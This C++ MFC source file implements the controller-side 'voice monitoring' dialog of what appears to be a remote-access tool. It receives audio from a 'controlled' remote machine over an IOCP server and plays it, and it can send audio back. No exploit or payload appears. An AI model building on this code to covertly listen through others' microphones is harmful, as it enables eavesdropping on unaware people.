﻿// CAudioDlg.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CAudioDlg.h"
#include"../../common/macros.h"
#include "afxdialogex.h"


// CAudioDlg 对话框

IMPLEMENT_DYNAMIC(CAudioDlg, CDialog)

CAudioDlg::CAudioDlg(CWnd* pParent, CIOCPServer* IOCPServer, ClientContext* ContextObject)
	: CDialog(IDD_AUDIO, pParent)
{
	m_bIsWorking = TRUE;
	m_bThreadRun = FALSE;
	m_iocpServer = IOCPServer;       //为类的成员变量赋值
	m_ContextObject = ContextObject;
	m_hWorkThread = NULL;
	m_nTotalRecvBytes = 0;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));        //得到被控端ip
	int iClientAddressLen = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->m_Socket, (SOCKADDR*)&ClientAddress, &iClientAddressLen);

	m_strIPAddress = bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "";

}

CAudioDlg::~CAudioDlg()
{
	m_bIsWorking = FALSE;
	while (m_bThreadRun)
		Sleep(50);
}

void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_CHECK1, &CAudioDlg::OnBnClickedCheck1)
END_MESSAGE_MAP()


// CAudioDlg 消息处理程序


BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CString strString;
	strString.Format("%s - 语音监听", m_strIPAddress);
	SetWindowText(strString);

	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));

	//启动线程 判断CheckBox
	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	m_bThreadRun = m_hWorkThread ? TRUE : FALSE;



	return TRUE;  // return TRUE unless you set the focus to a control
}

DWORD  CAudioDlg::WorkThread(LPVOID lParam)
{
	CAudioDlg* This = (CAudioDlg*)lParam;

	while (This->m_bIsWorking && This->m_iocpServer->IsRunning())
	{
		if (!This->m_bSend)
		{
			WAIT(This->m_bIsWorking, 1, 50);
			continue;
		}
		DWORD	dwBufferSize = 0;
		LPBYTE	szBuffer = This->m_AudioObject.GetRecordBuffer(&dwBufferSize);   //播放声音

		if (szBuffer != NULL && dwBufferSize > 0)
			This->m_iocpServer->Send(This->m_ContextObject, szBuffer, dwBufferSize); //没有消息头
	}
	This->m_bThreadRun = FALSE;
	return 0;
}


void CAudioDlg::OnReceiveComplete(void)
{
	m_nTotalRecvBytes += m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1;   //1000+ =1000 1
	CString	strString;
	strString.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_STATIC2, strString);

	switch (m_ContextObject->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:
	{
		m_AudioObject.PlayBuffer(m_ContextObject->m_DeCompressionBuffer.GetBuffer(1),
			m_ContextObject->m_DeCompressionBuffer.GetBufferLen() - 1);   //播放波形数据
		break;
	}

	default:
		// 传输发生异常数据
		break;
	}
}

void CAudioDlg::OnClose()
{
	CancelIo((HANDLE)m_ContextObject->m_Socket);
	closesocket(m_ContextObject->m_Socket);

	m_bIsWorking = FALSE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CDialog::OnClose();
}


void CAudioDlg::OnBnClickedCheck1()
{
	UpdateData(true);
}
